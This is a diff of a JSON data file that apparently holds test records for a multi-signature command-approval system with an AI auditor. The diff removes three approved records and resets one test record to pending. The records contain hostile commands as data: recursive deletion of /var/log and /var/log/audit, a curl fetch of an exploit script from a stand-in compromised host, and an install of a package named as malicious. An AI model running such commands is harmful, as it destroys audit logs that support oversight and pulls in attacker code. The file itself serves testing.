@@ -1,150 +1,16 @@
 [
   {
-    "id": "act_907249",
-    "createdAt": "2026-05-31T19:11:32.157Z",
-    "expiresAt": "2026-05-31T19:26:32.157Z",
-    "command": "npm install malicious-package",
-    "initiator": "B@fidusgate.internal",
-    "role": "admin",
-    "requiredVotes": 3,
-    "status": "approved",
-    "aiRating": "dangerous",
-    "aiReason": "AI Auditor critical threat detected: Dynamic third-party package installation bypasses auditor rules.",
-    "adminOverridden": true,
-    "approvals": [
-      {
-        "id": "app_746873",
-        "actionId": "act_907249",
-        "timestamp": "2026-05-31T19:12:50.227Z",
-        "approver": "A@fidusgate.internal",
-        "role": "developer",
-        "signature": "sig_attest_ft7h6g0w9x8_QUBmaWR1c2dhdGUu"
-      },
-      {
-        "id": "app_641699",
-        "actionId": "act_907249",
-        "timestamp": "2026-05-31T19:13:11.376Z",
-        "approver": "C@fidusgate.internal",
-        "role": "auditor",
-        "signature": "sig_attest_d3ql6ltj4ci_Q0BmaWR1c2dhdGUu"
-      },
-      {
-        "id": "app_709462",
-        "actionId": "act_907249",
-        "timestamp": "2026-05-31T19:13:24.289Z",
-        "approver": "D@fidusgate.internal",
-        "role": "admin",
-        "signature": "sig_attest_tykwrguw2k_REBmaWR1c2dhdGUu"
-      }
-    ]
-  },
-  {
-    "id": "act_117252",
-    "createdAt": "2026-05-31T19:11:31.547Z",
-    "expiresAt": "2026-05-31T19:26:31.547Z",
-    "command": "rm -rf /var/log/audit",
-    "initiator": "B@fidusgate.internal",
-    "role": "admin",
-    "requiredVotes": 3,
-    "status": "approved",
-    "aiRating": "dangerous",
-    "aiReason": "AI Auditor critical threat detected: Destructive recursive directory deletion attempt.",
-    "adminOverridden": true,
-    "approvals": [
-      {
-        "id": "app_963524",
-        "actionId": "act_117252",
-        "timestamp": "2026-05-31T19:12:51.060Z",
-        "approver": "A@fidusgate.internal",
-        "role": "developer",
-        "signature": "sig_attest_s6a0mpgx3f_QUBmaWR1c2dhdGUu"
-      },
-      {
-        "id": "app_679758",
-        "actionId": "act_117252",
-        "timestamp": "2026-05-31T19:13:12.218Z",
-        "approver": "C@fidusgate.internal",
-        "role": "auditor",
-        "signature": "sig_attest_xs8rpvnbm2f_Q0BmaWR1c2dhdGUu"
-      },
-      {
-        "id": "app_436057",
-        "actionId": "act_117252",
-        "timestamp": "2026-05-31T19:18:22.864Z",
-        "approver": "admin@fidusgate.internal",
-        "role": "admin",
-        "signature": "sig_attest_vwhu8kwt0pm_YWRtaW5AZmlkdXNn"
-      }
-    ]
-  },
-  {
-    "id": "act_921072",
-    "createdAt": "2026-05-31T19:11:30.931Z",
-    "expiresAt": "2026-05-31T19:26:30.931Z",
-    "command": "curl http://compromised-server.net/malicious-exploit.sh",
-    "initiator": "B@fidusgate.internal",
-    "role": "admin",
-    "requiredVotes": 3,
-    "status": "approved",
-    "aiRating": "dangerous",
-    "aiReason": "Kernel Security Exception: Outbound socket connection (sys_socket) blocked by seccomp filter at instruction pointer 0xfded.",
-    "adminOverridden": true,
-    "approvals": [
-      {
-        "id": "app_294468",
-        "actionId": "act_921072",
-        "timestamp": "2026-05-31T19:12:51.795Z",
-        "approver": "A@fidusgate.internal",
-        "role": "developer",
-        "signature": "sig_attest_llo9ixmjkjr_QUBmaWR1c2dhdGUu"
-      },
-      {
-        "id": "app_989907",
-        "actionId": "act_921072",
-        "timestamp": "2026-05-31T19:13:13.508Z",
-        "approver": "C@fidusgate.internal",
-        "role": "auditor",
-        "signature": "sig_attest_wancdtdbszb_Q0BmaWR1c2dhdGUu"
-      },
-      {
-        "id": "app_490267",
-        "actionId": "act_921072",
-        "timestamp": "2026-05-31T19:18:24.938Z",
-        "approver": "admin@fidusgate.internal",
-        "role": "admin",
-        "signature": "sig_attest_99xvl8phizj_YWRtaW5AZmlkdXNn"
-      }
-    ]
-  },
-  {
     "id": "cmd_dangerous_test",
-    "createdAt": "2026-05-31T19:09:09.145Z",
-    "expiresAt": "2026-05-31T20:09:09.145Z",
+    "createdAt": "2026-06-04T11:57:35.458Z",
+    "expiresAt": "2026-06-04T12:57:35.458Z",
     "command": "rm -rf /var/log",
     "initiator": "developer@fidusgate.internal",
     "role": "developer",
     "requiredVotes": 2,
-    "status": "completed",
+    "status": "pending",
     "aiRating": "dangerous",
     "aiReason": "AI Auditor critical threat detected",
     "adminOverridden": true,
-    "approvals": [
-      {
-        "id": "app_127432",
-        "actionId": "cmd_dangerous_test",
-        "timestamp": "2026-05-31T19:10:59.763Z",
-        "approver": "A@fidusgate.internal",
-        "role": "developer",
-        "signature": "sig_attest_50m1rmmm8lj_QUBmaWR1c2dhdGUu"
-      },
-      {
-        "id": "app_794030",
-        "actionId": "cmd_dangerous_test",
-        "timestamp": "2026-05-31T19:11:10.540Z",
-        "approver": "B@fidusgate.internal",
-        "role": "admin",
-        "signature": "sig_attest_j8k0uvm4baa_QkBmaWR1c2dhdGUu"
-      }
-    ]
+    "approvals": []
   }
 ]
